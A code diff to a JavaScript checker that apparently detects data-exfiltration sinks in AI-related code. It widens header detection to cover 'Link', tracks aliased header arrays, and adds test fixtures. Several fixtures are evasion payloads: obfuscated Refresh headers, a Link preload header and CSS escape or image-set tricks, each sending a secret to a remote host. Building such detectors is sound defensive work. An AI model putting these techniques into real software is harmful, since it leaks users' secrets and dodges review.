@@ -2049,16 +2049,30 @@ function hasAiRuntimeBoundary(content, path = "") {
     && !path.endsWith(".html")
     && (/\b(?:document|DOMParser|Image|location|open)\b|\.(?:submit|requestSubmit)\s*\(|\btext\/html\b/i.test(domSinkRemainder)
       || /<\s*(?:img|iframe|frame|script|link|audio|video|source|track|form|object|embed|meta|base|image|use|style)\b|\bstyle\s*=|\burl\s*\(|@import\b/i.test(domSinkRemainder));
-  const hasNavigationHeaderSink = /\bheaders\s*:\s*\{[^}]*?(?:["'`]?(?:refresh|location)["'`]?|\[\s*["'`](?:refresh|location)["'`]\s*\])\s*:/i.test(normalizedContent)
-    || /\.(?:set|append)\s*\(\s*["'`](?:refresh|location)["'`]/i.test(normalizedContent)
-    || /\[\s*["'`](?:refresh|location)["'`]\s*,/i.test(normalizedContent);
+  const hasNavigationHeaderSink = /\bheaders\s*:\s*\{[^}]*?(?:["'`]?(?:refresh|location|link)["'`]?|\[\s*["'`](?:refresh|location|link)["'`]\s*\])\s*:/i.test(normalizedContent)
+    || /\.(?:set|append)\s*\(\s*["'`](?:refresh|location|link)["'`]/i.test(normalizedContent)
+    || /\[\s*["'`](?:refresh|location|link)["'`]\s*,/i.test(normalizedContent);
   const hasObscuredResponseCapability = /\bnew\s*\(\s*(?:Response|Headers)\s*\)/.test(normalizedContent)
     || /=\s*(?:\(\s*)*(?:Response|Headers)\b/.test(normalizedContent)
     || /\b(?:Response|Headers)\.(?:bind|call|apply)\b/.test(normalizedContent);
-  const computedHeadersInitAliases = [...normalizedContent.matchAll(/\b(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*(?::[^=;]+)?=\s*\[\s*\[(?!\s*["'`])\s*/g)]
-    .map((match) => match[1]);
+  const computedHeadersInitAliases = new Set([
+    ...[...normalizedContent.matchAll(/\b(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*(?::[^=;]+)?=\s*\[\s*\[(?!\s*["'`])\s*/g)].map((match) => match[1]),
+    ...[...normalizedContent.matchAll(/\b([A-Za-z_$][\w$]*)\s*=\s*\[\s*\[(?!\s*["'`])\s*/g)].map((match) => match[1])
+  ]);
+  const headersInitAliasAssignments = [...normalizedContent.matchAll(/\b([A-Za-z_$][\w$]*)\s*=\s*([A-Za-z_$][\w$]*)\s*(?:[;,)])/g)]
+    .map((match) => ({ target: match[1], source: match[2] }));
+  let propagatedHeadersInitAlias = true;
+  while (propagatedHeadersInitAlias) {
+    propagatedHeadersInitAlias = false;
+    for (const { target, source } of headersInitAliasAssignments) {
+      if (computedHeadersInitAliases.has(source) && !computedHeadersInitAliases.has(target)) {
+        computedHeadersInitAliases.add(target);
+        propagatedHeadersInitAlias = true;
+      }
+    }
+  }
   const hasComputedHeadersInit = /(?:\bheaders\s*:|\bnew\s+Headers\s*\()\s*\[\s*\[(?!\s*["'`])\s*/i.test(normalizedContent)
-    || computedHeadersInitAliases.some((alias) => new RegExp(`(?:\\bheaders\\s*:\\s*|\\bnew\\s+Headers\\s*\\(\\s*)${alias}\\b`).test(normalizedContent));
+    || [...computedHeadersInitAliases].some((alias) => new RegExp(`(?:\\bheaders\\s*:\\s*|\\bnew\\s+Headers\\s*\\(\\s*)${alias}\\b`).test(normalizedContent));
   const hasComputedResponseHeader = /\bheaders\s*:\s*\{[^}]*\[[^\]]+\]\s*:/i.test(normalizedContent)
     || /\bnew\s+Headers\s*\(\s*\{[^}]*\[[^\]]+\]\s*:/i.test(normalizedContent)
     || hasComputedHeadersInit;
@@ -2338,6 +2352,8 @@ for (const fixture of [
   { content: 'const name = "Ref" + "resh"; return new Response("", { headers: [[name, `0; url=${env.REMOTE_URL}?data=${secret}`]] });', path: "apps/worker/src/capture-router.ts" },
   { content: 'const name = "Ref" + "resh"; const init = [[name, `0; url=${env.REMOTE_URL}?data=${secret}`]]; return new Response("", { headers: init });', path: "apps/worker/src/capture-router.ts" },
   { content: 'const name = "Ref" + "resh"; const init: HeadersInit = [[name, `0; url=${env.REMOTE_URL}?data=${secret}`]]; return new Response("", { headers: init });', path: "apps/worker/src/capture-router.ts" },
+  { content: 'const name = "Ref" + "resh"; let init: HeadersInit = []; init = [[name, `0; url=${env.REMOTE_URL}?data=${secret}`]]; const forwarded = init; return new Response("", { headers: forwarded });', path: "apps/worker/src/capture-router.ts" },
+  { content: 'return new Response("", { headers: { Link: `<${env.REMOTE_URL}?data=${secret}>; rel=preload; as=image` } });', path: "apps/worker/src/capture-router.ts" },
   { content: '<div style="background:u\\\\72l(//api.groq.com/pixel)"></div>', path: "apps/brand-site/public/css-escape-egress.html" },
   { content: '<div style="background-image:image-set(\'//api.groq.com/pixel\' 1x)"></div>', path: "apps/brand-site/public/css-image-set-egress.html" },
   { content: "select create_ai_adapter();", path: "supabase/migrations/ai-adapter.sql" }
